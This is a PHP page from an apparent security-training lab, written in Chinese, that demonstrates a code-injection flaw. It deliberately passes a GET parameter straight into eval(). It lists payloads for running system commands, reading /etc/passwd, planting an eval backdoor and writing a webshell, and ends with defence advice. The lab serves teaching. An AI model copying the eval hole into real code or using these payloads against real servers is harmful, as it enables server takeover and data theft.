<?php
// 代码执行漏洞
$module_name = '代码执行漏洞';
$module_icon = '🎯';
$module_desc = '通过代码执行函数导致的代码注入漏洞。';

// 漏洞代码
$result = '';
if (isset($_GET['calc'])) {
    $expression = $_GET['calc'];
    // 漏洞：直接使用eval执行用户输入的代码
    $result = eval("return $expression;");
}

// 页面内容
$content = <<<HTML
    <div class="card">
        <div class="card-header">
            <h5 class="mb-0">🎯 代码执行漏洞</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                代码执行漏洞允许攻击者在服务器上执行任意PHP代码。<br>
                当应用程序使用eval()等函数执行用户输入的字符串时，如果没有进行充分的过滤，就可能导致代码注入。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset(\$_GET['calc'])) {
    \$expression = \$_GET['calc'];
    // 漏洞：直接使用eval执行用户输入的代码
    \$result = eval("return \$expression;");
}</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景模拟一个计算器功能，输入数学表达式进行计算。尝试以下攻击payload：</p>

                    <div class="table-responsive">
                        <table class="table table-bordered">
                            <thead class="table-light">
                                <tr>
                                    <th>攻击类型</th>
                                    <th>Payload示例</th>
                                    <th>说明</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td>执行系统命令</td>
                                    <td><code>1;system('whoami')</code></td>
                                    <td>分号分隔执行系统命令</td>
                                </tr>
                                <tr>
                                    <td>执行系统命令</td>
                                    <td><code>1);system('dir');//</code></td>
                                    <td>闭合括号后执行命令</td>
                                </tr>
                                <tr>
                                    <td>读取文件</td>
                                    <td><code>file_get_contents('/etc/passwd')</code></td>
                                    <td>读取系统文件</td>
                                </tr>
                                <tr>
                                    <td>代码执行</td>
                                    <td><code>eval(\$_POST['x'])</code></td>
                                    <td>植入后门代码</td>
                                </tr>
                                <tr>
                                    <td>获取信息</td>
                                    <td><code>phpinfo()</code></td>
                                    <td>查看PHP配置信息</td>
                                </tr>
                                <tr>
                                    <td>写文件</td>
                                    <td><code>file_put_contents('shell.php','<?php eval(\$_POST[1]);?>')</code></td>
                                    <td>写入webshell</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🧰 常见代码执行函数</h6>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-bordered">
                            <thead class="table-light">
                                <tr>
                                    <th>函数</th>
                                    <th>说明</th>
                                    <th>危险等级</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr>
                                    <td><code>eval()</code></td>
                                    <td>将字符串作为PHP代码执行</td>
                                    <td><span class="badge bg-danger">极高</span></td>
                                </tr>
                                <tr>
                                    <td><code>assert()</code></td>
                                    <td>检查断言，可执行代码（PHP7+）</td>
                                    <td><span class="badge bg-danger">极高</span></td>
                                </tr>
                                <tr>
                                    <td><code>preg_replace()</code></td>
                                    <td>正则替换，/e修饰符可执行代码</td>
                                    <td><span class="badge bg-danger">高</span></td>
                                </tr>
                                <tr>
                                    <td><code>create_function()</code></td>
                                    <td>创建匿名函数，参数可注入代码</td>
                                    <td><span class="badge bg-danger">高</span></td>
                                </tr>
                                <tr>
                                    <td><code>array_map()</code></td>
                                    <td>数组映射，回调函数可控时危险</td>
                                    <td><span class="badge bg-warning">中</span></td>
                                </tr>
                                <tr>
                                    <td><code>call_user_func()</code></td>
                                    <td>调用回调函数，函数名可控时危险</td>
                                    <td><span class="badge bg-warning">中</span></td>
                                </tr>
                                <tr>
                                    <td><code>call_user_func_array()</code></td>
                                    <td>调用回调函数并传递参数数组</td>
                                    <td><span class="badge bg-warning">中</span></td>
                                </tr>
                                <tr>
                                    <td><code>array_filter()</code></td>
                                    <td>数组过滤，回调函数可控时危险</td>
                                    <td><span class="badge bg-warning">中</span></td>
                                </tr>
                                <tr>
                                    <td><code>usort()</code> / <code>uasort()</code></td>
                                    <td>自定义排序，比较函数可控时危险</td>
                                    <td><span class="badge bg-warning">中</span></td>
                                </tr>
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <form method="GET" class="mb-3">
                        <div class="input-group">
                            <span class="input-group-text">表达式</span>
                            <input type="text" name="calc" class="form-control" placeholder="输入数学表达式，例如：1+1">
                            <button type="submit" class="btn btn-primary">计算</button>
                        </div>
                    </form>

                    <?php if (\$result !== ''): ?>
                    <div class="alert alert-secondary">
                        <strong>计算结果：</strong>
                        <pre class="mb-0 mt-2"><code><?php echo htmlspecialchars(\$result); ?></code></pre>
                    </div>
                    <?php endif; ?>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>禁用危险函数：</strong>在php.ini中禁用eval、assert等危险函数</li>
                        <li><strong>避免使用eval：</strong>尽量使用替代方案，如计算库代替eval计算表达式</li>
                        <li><strong>输入验证：</strong>严格验证输入，只允许预期的字符（如数字、运算符）</li>
                        <li><strong>白名单：</strong>使用白名单机制限制可执行的函数</li>
                        <li><strong>Suhosin扩展：</strong>使用Suhosin等安全扩展限制危险函数</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>
HTML;

// 包含模板
include '../template/module_template.php';
?>